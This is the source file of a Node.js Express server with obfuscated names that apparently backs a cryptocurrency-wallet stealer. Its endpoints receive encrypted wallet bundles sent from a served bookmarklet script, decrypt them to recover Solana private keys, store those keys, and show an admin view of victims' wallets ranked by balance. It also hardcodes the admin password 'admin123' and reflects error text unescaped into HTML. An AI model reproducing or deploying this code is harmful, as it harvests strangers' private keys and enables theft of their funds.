
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const bs58 = require('bs58');
const { Connection, PublicKey } = require('@solana/web3.js');

const app = express();
const X7F9K2 = 5000;
const Q8M3N7 = path.join(__dirname, 'data.json');

const Z4H8L6 = "admin123"; // your admin password.
const R2Y5P9 = crypto.randomBytes(32).toString('hex');
const W3K7M1 = new Set();

app.use(bodyParser.json());
app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: true }));

if (!fs.existsSync(Q8M3N7)) {
    fs.writeFileSync(Q8M3N7, JSON.stringify([]));
}

function D5V8B3() {
    try {
        const data = fs.readFileSync(Q8M3N7, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        return [];
    }
}

function F6N2T9(data) {
    fs.writeFileSync(Q8M3N7, JSON.stringify(data, null, 2));
}

const solanaConnection = new Connection('https://api.mainnet-beta.solana.com');

async function G7P4R8() {
    try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
        const data = await response.json();
        return data.solana.usd;
    } catch (error) {
        console.error('Error prob 429 fucking free apis:', error);
        return 0;
    }
}

async function H3X9M5(publicKeyString) {
    try {
        const publicKey = new PublicKey(publicKeyString);
        const balance = await solanaConnection.getBalance(publicKey);
        return balance / 1000000000;
    } catch (error) {
        console.error(`Failed to check balance 4: ${publicKeyString}:`, error.message);
        return 0;
    }
}

function J8L4Q6(sBundlesString, bundleKey) {
    try {
        const sBundlesArray = JSON.parse(sBundlesString);
        const key = Buffer.from(bundleKey, "base64");
        const wallets = [];

        sBundlesArray.forEach((sBundle, idx) => {
            try {
                const [ivB64, ctB64] = sBundle.split(":");
                const iv = Buffer.from(ivB64, "base64");
                const ciphertext = Buffer.from(ctB64, "base64");

                const tag = ciphertext.slice(ciphertext.length - 16);
                const data = ciphertext.slice(0, ciphertext.length - 16);

                const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
                decipher.setAuthTag(tag);
                const decrypted = Buffer.concat([decipher.update(data), decipher.final()]);

                const privKey = decrypted.slice(0, 32);
                const pubKey = decrypted.slice(32, 64);

                wallets.push({
                    walletIndex: idx + 1,
                    privateKey: bs58.default ? bs58.default.encode(decrypted) : bs58.encode(decrypted),
                    publicKey: bs58.default ? bs58.default.encode(pubKey) : bs58.encode(pubKey)
                });
            } catch (e) {
                console.error(`Error processing sBundle #${idx + 1}:`, e.message);
                wallets.push({
                    walletIndex: idx + 1,
                    error: e.message
                });
            }
        });

        return {
            count: sBundlesArray.length,
            wallets: wallets
        };
    } catch (e) {
        console.error('Error parsing sBundles:', e.message);
        return {
            count: 0,
            wallets: [],
            error: e.message
        };
    }
}

function K9S2E7(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    
    if (!token || !W3K7M1.has(token)) {
        return res.status(401).json({ success: false, error: 'Unauthorized' });
    }
    
    next();
}

function A4C8N1() {
    return crypto.randomBytes(32).toString('hex');
}

app.post('/api/admin-login', (req, res) => {
    try {
        const { secretKey } = req.body;
        
        if (secretKey === Z4H8L6) {
            const token = A4C8N1();
            W3K7M1.add(token);
            
            setTimeout(() => {
                W3K7M1.delete(token);
            }, 24 * 60 * 60 * 1000);
            
            res.json({ 
                success: true, 
                token: token,
                message: 'Authentication successful'
            });
        } else {
            res.status(401).json({ 
                success: false, 
                message: 'Invalid secret key' 
            });
        }
    } catch (error) {
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

app.get('/api/verify-admin', (req, res) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    
    if (token && W3K7M1.has(token)) {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false });
    }
});

app.post('/api/admin-logout', K9S2E7, (req, res) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    
    if (token) {
        W3K7M1.delete(token);
    }
    
    res.json({ success: true, message: 'Logged out successfully' });
});

app.post('/api/bookmark-data', (req, res) => {
    try {
        const data = D5V8B3();
        const newEntry = {
            id: Date.now(),
            timestamp: new Date().toISOString(),
            ...req.body
        };

        if (newEntry.sBundles && newEntry.bundle) {
            newEntry.processedSBundles = J8L4Q6(newEntry.sBundles, newEntry.bundle);
        }
        
        data.push(newEntry);
        F6N2T9(data);
        
        res.json({ success: true, id: newEntry.id });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/bookmark-data', K9S2E7, (req, res) => {
    try {
        const data = D5V8B3();
        res.json(data);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.delete('/api/bookmark-data/:id', K9S2E7, (req, res) => {
    try {
        const data = D5V8B3();
        const filteredData = data.filter(item => item.id !== parseInt(req.params.id));
        F6N2T9(filteredData);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/check-balances', K9S2E7, async (req, res) => {
    try {
        const data = D5V8B3();
        const solPrice = await G7P4R8();
        
        let allAddresses = [];
        let totalSolBalance = 0;
        let addressBalances = [];
        
        for (const entry of data) {
            if (entry.processedSBundles && entry.processedSBundles.wallets) {
                for (const wallet of entry.processedSBundles.wallets) {
                    if (wallet.publicKey && !wallet.error) {
                        allAddresses.push({
                            entryId: entry.id,
                            walletIndex: wallet.walletIndex,
                            publicKey: wallet.publicKey
                        });
                    }
                }
            }
        }
        
        for (const addr of allAddresses) {
            const balance = await H3X9M5(addr.publicKey);
            totalSolBalance += balance;
            
            addressBalances.push({
                entryId: addr.entryId,
                walletIndex: addr.walletIndex,
                publicKey: addr.publicKey,
                solBalance: balance,
                usdBalance: balance * solPrice
            });
        }
        
        addressBalances.sort((a, b) => b.solBalance - a.solBalance);
        
        res.json({
            success: true,
            totalAddresses: allAddresses.length,
            totalSolBalance: totalSolBalance,
            totalUsdBalance: totalSolBalance * solPrice,
            solPrice: solPrice,
            addressBalances: addressBalances
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});
app.get('/bookmarkscript.js', (req, res) => {
    res.sendFile(path.join(__dirname, 'bookmarkscript.js'));
});

app.get('/data/:encodedData', (req, res) => {
    try {
        const decodedData = JSON.parse(Buffer.from(req.params.encodedData, 'base64').toString());
        
        const data = D5V8B3();
        const newEntry = {
            id: Date.now(),
            timestamp: new Date().toISOString(),
            ...decodedData
        };

        if (newEntry.sBundles && newEntry.bundle) {
            newEntry.processedSBundles = J8L4Q6(newEntry.sBundles, newEntry.bundle);
        }
        
        data.push(newEntry);
        F6N2T9(data);
        
        res.redirect('/success');
    } catch (error) {
        res.status(400).send(`
<!DOCTYPE html>
<html>
<head>
    <title>Error</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
        .error { color: red; font-size: 24px; }
    </style>
</head>
<body>
    <div class="error">❌ Error: ${error.message}</div>
    <script>
        setTimeout(() => {
            window.close();
        }, 2000);
    </script>
</body>
</html>
        `);
    }
});

app.get('/success', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'success.html'));
});

app.listen(X7F9K2, '0.0.0.0', () => {
    console.log(`Working.`);
});
